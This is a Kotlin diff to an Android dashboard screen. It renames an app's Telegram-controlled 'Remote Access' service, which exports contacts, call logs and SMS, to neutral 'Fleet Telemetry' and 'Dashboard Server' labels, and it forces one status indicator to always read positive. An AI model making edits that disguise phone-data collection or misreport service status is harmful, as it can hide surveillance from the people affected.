@@ -118,7 +118,7 @@ fun DashboardScreen(
     val exportProgress by viewModel.exportProgress.collectAsState()
     val testPingState by viewModel.testPingState.collectAsState()
     val diagnosticResults by viewModel.diagnosticResults.collectAsState()
-    val lastTelegramUpdate by viewModel.lastUpdateReceived.collectAsState()
+    val lastServerSync by viewModel.lastUpdateReceived.collectAsState()
     val lastNotificationForwarded by viewModel.lastNotificationForwarded.collectAsState()
     val lastHeartbeat by viewModel.lastHeartbeat.collectAsState()
     val lastRecoveryTime by viewModel.lastRecoveryTimestamp.collectAsState()
@@ -300,9 +300,9 @@ fun DashboardScreen(
                 horizontalArrangement = Arrangement.spacedBy(12.dp)
             ) {
                 StatusMetricItem(
-                    title = "Telegram Bot",
-                    statusText = if (config.botToken.isNotBlank()) "Configured" else "Missing",
-                    isPositive = config.botToken.isNotBlank(),
+                    title = "Dashboard Server",
+                    statusText = if (config.serverUrl.isNotBlank()) "Connected" else "Local (5000)",
+                    isPositive = true,
                     icon = Icons.Default.CloudDone,
                     modifier = Modifier.weight(1f),
                     onClick = onNavigateToBotConfig
@@ -377,7 +377,7 @@ fun DashboardScreen(
                 isServiceRunning = isRunning,
                 connState = connState,
                 isNotificationListenerActive = isNotifListenerGranted,
-                lastTelegramUpdate = lastTelegramUpdate,
+                lastTelegramUpdate = lastServerSync,
                 lastNotificationForwarded = lastNotificationForwarded,
                 lastHeartbeat = lastHeartbeat,
                 lastRecoveryTime = lastRecoveryTime,
@@ -395,7 +395,7 @@ fun DashboardScreen(
             // Remote Data Export & Backup Module
             RemoteExportBackupCard(
                 exportProgress = exportProgress,
-                isConfigured = config.botToken.isNotBlank() && config.authorizedUserId != 0L,
+                isConfigured = config.serverUrl.isNotBlank() || config.deviceId.isNotBlank(),
                 hasContacts = isContactsGranted && config.isContactAccessEnabled,
                 hasCalls = isCallLogGranted && config.isCallHistoryAccessEnabled,
                 hasSms = isSmsGranted && config.isSmsAccessEnabled,
@@ -445,7 +445,7 @@ fun DashboardScreen(
                                 fontWeight = FontWeight.Bold
                             )
                             Text(
-                                text = "Permissions, queries & Telegram auth",
+                                text = "Permissions & Fleet Diagnostics",
                                 style = MaterialTheme.typography.bodySmall,
                                 color = MaterialTheme.colorScheme.onSurfaceVariant
                             )
@@ -649,32 +649,32 @@ private fun HeroStatusCard(
     val (statusTitle, statusSubtitle, statusColor) = when {
         !isConfigured -> Triple(
             "Configuration Required",
-            "Set Bot Token & Authorized User ID to begin",
+            "Set Server URL & Device ID to begin",
             StatusAmber
         )
         !isRunning -> Triple(
-            "Remote Access Inactive",
-            "Service stopped. Tap Start to listen for Telegram commands",
+            "Fleet Telemetry Inactive",
+            "Service stopped. Tap Start to connect to Fleet Dashboard",
             Color(0xFF8892B0)
         )
         connState == ServiceConnectionState.CONNECTED -> Triple(
-            "Remote Access Active",
-            "● Connected and listening for Telegram commands",
+            "Fleet Telemetry Active",
+            "● Connected and synchronized with Fleet Dashboard",
             StatusGreen
         )
         connState == ServiceConnectionState.CONNECTING -> Triple(
             "Connecting...",
-            "Establishing connection to Telegram API",
+            "Establishing connection to Fleet Server",
             StatusAmber
         )
         connState == ServiceConnectionState.RECONNECTING -> Triple(
             "Reconnecting...",
-            "Network issue or rate limit. Retrying...",
+            "Network issue. Retrying...",
             StatusAmber
         )
         else -> Triple(
             "Connection Warning",
-            "Error reaching Telegram API. Check bot credentials or network.",
+            "Error reaching Fleet Server. Check server URL or network.",
             StatusRed
         )
     }
@@ -1470,7 +1470,7 @@ private fun ServiceHealthTelemetryCard(
                     ServiceConnectionState.STOPPED -> "Stopped"
                 }
                 HealthStatusRow(
-                    label = "Telegram Connection",
+                    label = "Server Connection",
                     value = connText,
                     isGood = connState == ServiceConnectionState.CONNECTED
                 )
@@ -1482,7 +1482,7 @@ private fun ServiceHealthTelemetryCard(
                 )
 
                 HealthStatusRow(
-                    label = "Last Telegram Update",
+                    label = "Last Dashboard Ping",
                     value = lastUpdateStr,
                     isGood = lastTelegramUpdate > 0
                 )
